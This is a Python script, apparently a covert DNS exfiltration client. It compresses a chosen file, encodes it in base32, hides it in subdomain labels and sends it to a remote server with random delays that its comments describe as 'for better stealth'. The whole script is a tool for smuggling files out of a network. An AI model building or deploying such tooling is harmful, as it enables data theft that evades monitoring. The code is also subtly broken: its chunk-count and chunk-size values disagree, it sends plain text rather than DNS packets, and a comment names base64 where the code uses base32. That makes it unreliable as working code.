import socket
import base64
import hashlib
import os
import time
import random
import zlib

DNS_SERVER = "your.dns.server.hostname_or_ip"  # Replace with actual DNS server IP or hostname
DNS_PORT = 53
domain = "fileupload.example.com"  # Subdomain to use for DNS queries

# Function to calculate MD5 hash of a file
def calculate_md5(file_path):
    md5_hash = hashlib.md5()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            md5_hash.update(byte_block)
    return md5_hash.hexdigest()

# Function to compress and encode data in base64 for better stealth
def compress_and_encode(data):
    compressed_data = zlib.compress(data)
    encoded_data = base64.b32encode(compressed_data).decode().strip("=")
    return encoded_data

# Function to resolve the DNS server hostname to an IP address (if necessary)
def resolve_dns_server(server):
    try:
        # Perform DNS lookup (if a hostname is used)
        resolved_ip = socket.gethostbyname(server)
        print(f"Resolved {server} to {resolved_ip}")
        return resolved_ip
    except socket.gaierror as e:
        print(f"Error resolving DNS server: {e}")
        return None

# Function to send a DNS query with a random delay based on user input
def send_dns_query(data, server_ip, max_delay):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if len(data) > 253:
        print(f"Error: DNS query exceeds the 253 character limit: {len(data)} characters.")
        return
    sock.sendto(data.encode(), (server_ip, DNS_PORT))
    
    # Add a random delay between 0.1 seconds and the user-provided maximum delay
    delay = random.uniform(0.1, max_delay)
    print(f"Query sent, delaying next query by {delay:.2f} seconds.")
    time.sleep(delay)

def calculate_chunk_md5(chunk_data):
    md5 = hashlib.md5()
    md5.update(chunk_data)
    return md5.hexdigest().upper()

def send_file_chunks(file_path, resolved_ip, domain, max_delay, total_chunks):
    chunk_size = 64  # Reduced chunk size
    
    with open(file_path, "rb") as file:
        for chunk_number in range(total_chunks):
            chunk_data = file.read(chunk_size)
            encoded_chunk_data = compress_and_encode(chunk_data)

            chunk_md5 = calculate_chunk_md5(chunk_data)
            print(f"Client: MD5 of chunk {chunk_number + 1}: {chunk_md5}")

            subdomains = [encoded_chunk_data[i:i+63] for i in range(0, len(encoded_chunk_data), 63)]
            query = f"c{chunk_number}." + ".".join(subdomains) + f".{domain}"

            # Send the query here (as before)
            send_dns_query(query, resolved_ip, max_delay)

    print("All chunks have been sent successfully.")

# Function to send file information (filename, MD5 hash, and total chunks)
def send_file_info(file_name, file_md5, total_chunks, resolved_ip, domain, max_delay):
    # Compress and encode the file name and MD5 hash for better stealth
    encoded_file_name = compress_and_encode(file_name.encode())
    encoded_file_md5 = compress_and_encode(file_md5.encode())

    query = f"f.{encoded_file_name}.{encoded_file_md5}.{total_chunks}.{domain}"
    print(f"Sending file info: {file_name}, MD5: {file_md5}, Total Chunks: {total_chunks}")

    # Check total query length (should be <= 253 characters)
    if len(query) > 253:
        print(f"Error: Query length exceeds limit: {len(query)} characters.")
        return

    send_dns_query(query, resolved_ip, max_delay)

# Function to signal end of transmission
def send_end_signal(resolved_ip, domain, max_delay):
    # Use static "end" prefix for the end-of-transmission signal
    query = f"e.end.{domain}"

    # Check total query length (should be <= 253 characters)
    if len(query) > 253:
        print(f"Error: Query length exceeds limit: {len(query)} characters.")
        return

    print("Sending end of transmission signal")
    send_dns_query(query, resolved_ip, max_delay)
    print("File transmission complete!")

# Main client function
def send_file(file_path, max_delay):
    # Strip any extraneous quotes from the file path
    file_path = file_path.strip('"').strip("'")

    file_name = os.path.basename(file_path)
    file_md5 = calculate_md5(file_path)

    # Calculate total number of chunks
    file_size = os.path.getsize(file_path)
    chunk_size = 512
    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)

    # Resolve DNS server to IP address
    resolved_ip = resolve_dns_server(DNS_SERVER)
    if not resolved_ip:
        print("Unable to resolve DNS server. Exiting...")
        return

    # Send file info (filename, MD5 hash, and total chunks)
    send_file_info(file_name, file_md5, total_chunks, resolved_ip, domain, max_delay)

    # Send file chunks with chunk counter and random delays
    send_file_chunks(file_path, resolved_ip, domain, max_delay, total_chunks)

    # Signal the end of transmission
    send_end_signal(resolved_ip, domain, max_delay)

# Example usage
file_path = input("Enter the file path to send (quotes allowed): ").strip()
max_delay = float(input("Enter the maximum delay (in seconds) between queries: "))
send_file(file_path, max_delay)
